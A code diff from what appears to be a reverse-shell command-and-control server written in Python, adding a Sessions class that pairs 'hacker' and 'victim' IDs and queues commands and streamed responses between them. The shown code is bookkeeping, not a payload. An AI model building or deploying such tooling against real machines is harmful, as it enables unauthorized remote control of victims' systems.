@@ -1,20 +1,21 @@
 """ Accept and validate configuration, and facilitate and make ready any other
 data that is potentially useful for the server. """
 
+# --- the imports
 import json as js
 import sqlite3 as sq
 from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser, Namespace
+from http import HTTPStatus
+
+# from http.client import HTTPMessage
 from pathlib import Path
 from typing import Any, Literal, Optional
 
 import reverse_shell.utils as ut
-
-# --- the imports
 from reverse_shell import __app_name__, __version__
 from reverse_shell.server import ErrorCodes as ec
 
 
-# Gonna break down the config class into multiple classes.
 class Database:
     def __init__(
         self, db_path: Path | None, base_dir: Path, allow_multithreaded_db: bool = False
@@ -79,10 +80,11 @@ class Database:
 
         return "".join(schema_lst)
 
-    def query(self, cur: sq.Cursor, query: str, __params=None):
+    def query(self, query: str, __params=None):
         """Return all results that return from a database query provided by `query` and return None when`sqlite3.OperationalError` occurs"""
         # Let's execute and handle the query
         try:
+            cur = self.session_data.cursor()
             cur.execute(query, __params if __params is not None else ())
             return cur.fetchall()
         except sq.Error:
@@ -167,6 +169,96 @@ class Database:
         return db
 
 
+class Sessions:
+    """Manages sessions(hackers with victims) and allows to add new sessions, delete existing ones
+    and etc... using a session_id."""
+
+    def __init__(self):
+        # Let's define variables and data structures that help us
+        # control the sessions
+
+        # List of clients currently in session with a hacker.
+        self._client_list = []
+
+        self._sessions: dict[str, dict[Literal["hacker_id", "victim_id"], str]] = {
+            # session_id: {
+            #   hacker_id: "hacker_id",
+            #   victim_id: "victim_id"
+            # },
+        }
+
+        # The way the hacker and the victim talk is through this database.
+        self._session_communications: dict[
+            str, dict[Literal["command", "responses"], str | list[str]]
+        ] = {
+            # session_id: {
+            #   command: "some command"
+            #   responses: ["Some responses", "here and there"]
+            # }
+        }
+
+    def add_session(self, hacker_id: str, victim_id: str):
+        """Create a new session based on the hacker and victim id provided."""
+        # First check if either the hacker or the hacker are already in  a session.
+        if self.check_client_in_session(hacker_id) or self.check_client_in_session(
+            victim_id
+        ):
+            raise Exception("Either the hacker or victim provided are in a session")
+
+        # Creating the session id
+        session_id = ut.generate_token()
+
+        # Initializing the data in both dictionaries
+        self._sessions[session_id] = {
+            "hacker_id": hacker_id,
+            "victim_id": victim_id,
+        }
+
+        self._session_communications[session_id] = {"command": "", "responses": []}
+
+        # And also add the hacker and victim in the client list
+        self._client_list.extend([hacker_id, victim_id])
+        return session_id
+
+    def remove_session(self, session_id: str):
+        """Remove the session based on the session id."""
+        # First check if the session exists
+        if not self.check_session_active(session_id):
+            raise Exception(f"The session_id: `{session_id}` doesn't exist")
+
+        # Now let's fetch the hacker and victim with that session_id
+        hacker_victim_ids = self._sessions[session_id]
+
+        # Removing them from the client_list list
+        for client_id in hacker_victim_ids.values():
+            self._client_list.remove(client_id)
+
+        del self._session_communications[session_id]
+        del self._sessions[session_id]
+
+    def check_session_active(self, session_id: str):
+        """Check if the given session exists and is active."""
+        return True if self._sessions.get(session_id, None) is not None else False
+
+    def check_client_in_session(self, client_id: str):
+        """Check if the given client is in a session. The client should be either a victim or hacker"""
+        return True if client_id in self._client_list else False
+
+
+class HandlerResponse:
+    """A type representing the return value of the handler functions."""
+
+    def __init__(
+        self,
+        successful: bool,
+        res_code: HTTPStatus,
+        body: Optional[bytes] = None,
+    ):
+        self.successful = successful
+        self.res_code = res_code
+        self.body = body
+
+
 class LiveSessionData:
     def __init__(self):
         # A map of a victim with it's hacker that are in a live session
@@ -182,7 +274,8 @@ class LiveSessionData:
         ] = {
             # hacker_id: {
             # command: "current_cmd_set_by_hacker",
-            # response: [] # Responses are lists because a hacker might miss something so rather than
+            # response: [] # Responses are lists instead of strings because a the responses are streams of outputs
+            # and also it helps the hacker not to miss something so rather than
             #  overwriting the key like a string the server will append it on the list.
             # }
         }
